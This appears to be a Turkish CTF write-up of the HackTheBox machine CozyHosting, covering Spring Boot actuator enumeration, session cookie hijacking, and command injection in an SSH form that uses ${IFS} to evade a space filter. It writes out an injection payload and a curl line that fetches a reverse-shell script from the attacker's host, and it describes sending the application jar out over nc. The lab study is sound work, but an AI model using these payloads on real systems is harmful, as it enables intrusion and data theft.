---
{"dg-publish":true,"permalink":"/ctf/cozy-hosting-ctf/"}
---

![Pasted image 20241017001523.png](/img/user/resimler/Pasted%20image%2020241017001523.png)

![Pasted image 20241017001837.png](/img/user/resimler/Pasted%20image%2020241017001837.png)

OpenSSH sürümüne göre, host muhtemelen Ubuntu 22.04 jammy çalıştırıyor.

80'deki HTTP sunucusu cozyhosting.htb'ye yönlendiriyor. Host tabanlı yönlendirme kullanıldığından, farklı yanıt veren diğer alt alan adlarını araştıracağım, ancak bulamadım.

![Pasted image 20241017002235.png](/img/user/resimler/Pasted%20image%2020241017002235.png)
Domain'i ziyaret ettiğimizde, hosting servisleri sunuyor gibi görünen bir web sitesi görüyoruz

### Website - TCP 80
Site bir web hosting şirketi için:
![Pasted image 20241017002415.png](/img/user/resimler/Pasted%20image%2020241017002415.png)

Sağ üstteki “ Login” düğmesi hariç sayfadaki tüm bağlantılar sayfadaki başka yerlere gitmektedir.

Login sayfasında kullanıcı adı ve şifre sorulmaktadır:

![Pasted image 20241017002451.png](/img/user/resimler/Pasted%20image%2020241017002451.png)

Admin / admin gibi bazı basit tahminler işe yaramıyor.
![Pasted image 20241017002752.png](/img/user/resimler/Pasted%20image%2020241017002752.png)

Daha az yaygın olan başka başlıklar da var, ancak neyin kullanıldığını tanımlayan hiçbir şey yok. Oturum açmaya çalıştığımda, başarısız olsam bile, bir cookie ayarlanmış oluyor:
![Pasted image 20241017002943.png](/img/user/resimler/Pasted%20image%2020241017002943.png)

JSESSIONID, Java tabanlı bir web framework'ü öneriyor.

404 sayfası ilginç:

![Pasted image 20241017003031.png](/img/user/resimler/Pasted%20image%2020241017003031.png)

Bu, Java Spring Boot için varsayılan hata sayfasıyla eşleşir:
![Pasted image 20241017003417.png](/img/user/resimler/Pasted%20image%2020241017003417.png)


#### Directory Brute Force
Feroxbuster'ı siteye karşı çalıştıracağım:
![Pasted image 20241017003725.png](/img/user/resimler/Pasted%20image%2020241017003725.png)
![Pasted image 20241017003753.png](/img/user/resimler/Pasted%20image%2020241017003753.png)

Kimlik doğrulaması gerektiren bir /admin sayfası var .

/error 404 hatasına benzer bir hata gösteriyor:
![Pasted image 20241017003847.png](/img/user/resimler/Pasted%20image%2020241017003847.png)

SecLists'in Springboot için özel bir kelime listesi var. Feroxbuster'ı bu listeyle tekrar çalıştıracağım:
![Pasted image 20241017004136.png](/img/user/resimler/Pasted%20image%2020241017004136.png)
![Pasted image 20241017004152.png](/img/user/resimler/Pasted%20image%2020241017004152.png)
“/actuator” yolu ilginçtir ve diğer her şey bunun bir parçasıdır.

![Pasted image 20241017004549.png](/img/user/resimler/Pasted%20image%2020241017004549.png)


#### Actuators
Spring Boot, actuator olarak bilinen uygulamaları izlemek, yönetmek ve debug etmek için tasarlanmış bir dizi özellik içerir. /actuator/mapping, yalnızca actuator'lar değil, aynı zamanda uygulama için diğer endpoint'ler de dahil olmak üzere uygulama hakkında ayrıntılı bir liste verir:
![Pasted image 20241017004743.png](/img/user/resimler/Pasted%20image%2020241017004743.png)
Bu bir ton veri demek, ancak biraz jq foo ile güzel bir liste elde edebilirim:
![Pasted image 20241017004904.png](/img/user/resimler/Pasted%20image%2020241017004904.png)

/addhost ve /executessh, ama bunlara geri döneceğim.

/actuator/env bazı yapılandırma değerlerine benziyor, ancak ilginç olanların çoğu (ve bazıları ilginç olmayanlar) maskelenmiş, “*” dizeleri olarak gösteriliyor.

/actuator/sessions hemen ilginçtir:

![Pasted image 20241017004949.png](/img/user/resimler/Pasted%20image%2020241017004949.png)

Birkaç kez oturum açmayı deneyip başarısız olursanız, daha fazla oturum görünür:

![Pasted image 20241017005139.png](/img/user/resimler/Pasted%20image%2020241017005139.png)


### Uygulama olarak Shell
Oturum Çalma
Firefox geliştirme araçlarına girip Storage -> Cookies altında JSESSIONID değerini kandersons kullanıcısının cookie'si ile değiştireceğim.

Şimdi /login'i yenilediğimde veya /admin'i ziyaret ettiğimde, bir panel var ve K. Anderson olarak kimliğim doğrulanıyor:

![Pasted image 20241017005331.png](/img/user/resimler/Pasted%20image%2020241017005331.png)

Automatic Patching
Sayfanın ilginç kısmı en alttaki form. Hostname olarak IP'mi ve kullanıcı adı olarak asd'yi girdiğimde kısa bir beklemeden sonra hata veriyor:

![Pasted image 20241017005630.png](/img/user/resimler/Pasted%20image%2020241017005630.png)
![Pasted image 20241017005711.png](/img/user/resimler/Pasted%20image%2020241017005711.png)
Bu, /executessh adresine yapılan bir POST isteğidir (yukarıda fark edilmiştir).

Wireshark'ı çalıştırarak tekrar deneyeceğim, ancak hostuma bağlantı yok. Giden bağlantıları engelleyen bir güvenlik duvarı olmalı.

Localhost'u hedef almasını deneyeceğim. Bu farklı bir hata:
![Pasted image 20241017005910.png](/img/user/resimler/Pasted%20image%2020241017005910.png)
![Pasted image 20241017005850.png](/img/user/resimler/Pasted%20image%2020241017005850.png)


### Command Injection
Hata mesajına ve özel bir anahtar kullandığını söylemesine dayanarak, sunucunun bağlanmak için ssh -i [key] [username]@[hostname] çalıştırıyor olması muhtemel görünüyor. Eğer durum buysa, komut enjeksiyonu güvenlik açıklarını test edebilirim. İlk denemem “Invalid hostname!” döndürüyor:

![Pasted image 20241017010246.png](/img/user/resimler/Pasted%20image%2020241017010246.png)
Bu da bir tür filtreleme yapıldığını gösteriyor. ; yerine & ve | karakterlerini deneyeceğim ama sonuç aynı. Yasaklı karakterlerin ne olduğunu görmek için fuzzing yapmadan önce, kullanıcı adı alanında deneyeceğim. Bu farklı bir hata mesajı:
![Pasted image 20241017010433.png](/img/user/resimler/Pasted%20image%2020241017010433.png)
Linux terminal bağlamında boşluk olmadan beyaz alan elde etmenin birkaç yolu vardır. Ben ${IFS} kullanacağım bir boşluk olan bir Bash ortam değişkeni olarak ve bir şekilde çalışıyor:
![Pasted image 20241017010516.png](/img/user/resimler/Pasted%20image%2020241017010516.png)

  
Komutu veriyor:

![Pasted image 20241017010600.png](/img/user/resimler/Pasted%20image%2020241017010600.png)
0xdf'yi 0.0.0.223 olarak işlemesi ilginç ama önemli değil. SSH başarısız oluyor ve sonra 10.10.14.6@localhost'a ping atmaya çalışıyor. Yani komutum biraz bozuk ama çalışıyor. Sonuna bir yorum # ekleyeceğim:
![Pasted image 20241017010628.png](/img/user/resimler/Pasted%20image%2020241017010628.png)

Başarısız gösteriyor, ancak tcpdump ile kutumda bir ICMP paketi görüyorum:

![Pasted image 20241017010915.png](/img/user/resimler/Pasted%20image%2020241017010915.png)


```shell-session
asd;ping${IFS}-c${IFS}1${IFS}10.10.14.3;#
```

![Pasted image 20241017011008.png](/img/user/resimler/Pasted%20image%2020241017011008.png)

Bu komut enjeksiyonu!

Alternatif olarak, Bash'te parantez genişletme ile boşluklar da ekleyebilirim, bu nedenle kullanıcı adı 0xdf;{ping,-c,1,10.10.14.6};# de çalışır:  
--> https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html

![Pasted image 20241017011108.png](/img/user/resimler/Pasted%20image%2020241017011108.png)
Bu da şu anlama geliyor:
![Pasted image 20241017011120.png](/img/user/resimler/Pasted%20image%2020241017011120.png)


### Shell
Java uygulamaları işlemlerde piping ve özel karakterler konusunda çok zorlayıcı olabiliyor, bu yüzden diske bir Bash script yazıp çalıştırmak gibi basit bir yol izleyeceğim. Lokal olarak rev.sh adında bir reverse shell script oluşturacağım:
![Pasted image 20241017011220.png](/img/user/resimler/Pasted%20image%2020241017011220.png)

Daha hızlı göndermek için isteklerimi Burp Repeater'a geçireceğim. Sunucumdan rev.sh dosyasını almak için curl kullanacağım:
![Pasted image 20241017011349.png](/img/user/resimler/Pasted%20image%2020241017011349.png)

Ama yanıtta bir hata var:
%3bcurl${IFS}http://10.10.14.3/rev.sh${IFS}-o${IFS}rev.sh
![Pasted image 20241017011527.png](/img/user/resimler/Pasted%20image%2020241017011527.png)
![Pasted image 20241017011536.png](/img/user/resimler/Pasted%20image%2020241017011536.png)
Ama yanıtta bir hata var:
![Pasted image 20241017011555.png](/img/user/resimler/Pasted%20image%2020241017011555.png)

Eğer /tmp/rev.sh dosyasına taşırsam, çalışıyor gibi görünüyor:

![Pasted image 20241017011627.png](/img/user/resimler/Pasted%20image%2020241017011627.png)

![Pasted image 20241017011659.png](/img/user/resimler/Pasted%20image%2020241017011659.png)

bash /tmp/rev.sh dosyasını çalıştırmak için başka bir istek göndereceğim:

![Pasted image 20241017011844.png](/img/user/resimler/Pasted%20image%2020241017011844.png)

![Pasted image 20241017011852.png](/img/user/resimler/Pasted%20image%2020241017011852.png)

Script tekniğini kullanarak shell'imi yükselteceğim:
 --> https://www.youtube.com/watch?v=DqE6DxqJg8Q

İstek askıda kalıyor, ancak dinlediğim nc'de bir shell var:

Komut dosyası tekniğini kullanarak kabuğumu yükselteceğim:

![Pasted image 20241017012114.png](/img/user/resimler/Pasted%20image%2020241017012114.png)

### Shell as josh
Enumeration
Web Uygulaması
Web uygulaması, bir Java Jar dosyası içeren /app dışında çalışmaktadır:
![Pasted image 20241017012418.png](/img/user/resimler/Pasted%20image%2020241017012418.png)

Jar çalışıyor:
![Pasted image 20241017012445.png](/img/user/resimler/Pasted%20image%2020241017012445.png)

Bu proses 8080'i dinliyor:
![Pasted image 20241017012608.png](/img/user/resimler/Pasted%20image%2020241017012608.png)

Ve nginx'in cozyhosting.htb için trafiği 8080 portuna yönlendirdiğini görebiliyorum:
![Pasted image 20241017012649.png](/img/user/resimler/Pasted%20image%2020241017012649.png)


### Home Directories
Home dizini olan bir kullanıcı var, ancak uygulama buna erişemiyor:
![Pasted image 20241017012745.png](/img/user/resimler/Pasted%20image%2020241017012745.png)
Uygulamanın erişebileceği başka ilginç bir şey yok.


### cloudhosting-0.0.1.jar
Strateji
Web uygulamasına bir göz atacağım ve her ikisi de ilerlemem için gereken aynı bilgilere ulaşan birkaç yaklaşım var:
![Pasted image 20241017012935.png](/img/user/resimler/Pasted%20image%2020241017012935.png)

### CozyHosting üzerinde Unzip
Jar dosyaları Java Arşiv dosyalarıdır. Java uygulamasını (bu durumda bir web sunucusu) çalıştırmak için gereken tüm dosyaları içerirler ve aslında sadece Zip dosyasıdırlar. Bunun bir kopyasını almanın hızlı ve kolay yolu, ilk bakışı yapmak için dosyayı açmaktır:
![Pasted image 20241017013113.png](/img/user/resimler/Pasted%20image%2020241017013113.png)
Uygulamanın giriş noktası MANIFEST.MF dosyasında htb.cloudhosting.CozyHostingApp olarak tanımlanmıştır:
![Pasted image 20241017013150.png](/img/user/resimler/Pasted%20image%2020241017013150.png)
Ancak kod analizini daha güzel bir uygulama için saklayacağım. Tüm bu dosyalara sahip olmak, parola aramak gibi şeyler yapmamı sağlıyor:
![Pasted image 20241017013230.png](/img/user/resimler/Pasted%20image%2020241017013230.png)

İlk satırda ilginç görünen bir veri kaynağı parolası var. O dosyayı inceleyeceğim:
![Pasted image 20241017013256.png](/img/user/resimler/Pasted%20image%2020241017013256.png)
Bu veritabanı bağlantı bilgisidir.

#### jd-gui
Nc dinlemeye başlayacağım ve herhangi bir çıktıyı hostumdaki cloudhosting-0.0.1.jar adresine yönlendireceğim:
![Pasted image 20241017013401.png](/img/user/resimler/Pasted%20image%2020241017013401.png)
CozyHosting'de, Jar'ı nc'ye hostuma geri göndereceğim:
![Pasted image 20241017013430.png](/img/user/resimler/Pasted%20image%2020241017013430.png)
Bu kilitleniyor, ancak hostumda bir bağlantı gösteriyor:
![Pasted image 20241017013455.png](/img/user/resimler/Pasted%20image%2020241017013455.png)
Birkaç saniye sonra, kendi tarafımdaki işlemi sonlandıracağım ve iki dosyanın md5 toplamının eşleştiğinden emin olacağım.

jd-gui Jar dosyasını indireceğim ve java -jar jd-gui-1.6.6.jar ile çalıştırıp Jar dosyasını açacağım. htb.cloudhosting.CozyHostingApp sınıfı sadece Spring Boot uygulamasını başlatır:
![Pasted image 20241017013652.png](/img/user/resimler/Pasted%20image%2020241017013652.png)
Application.properties dosyası da DB bilgileriyle birlikte orada:
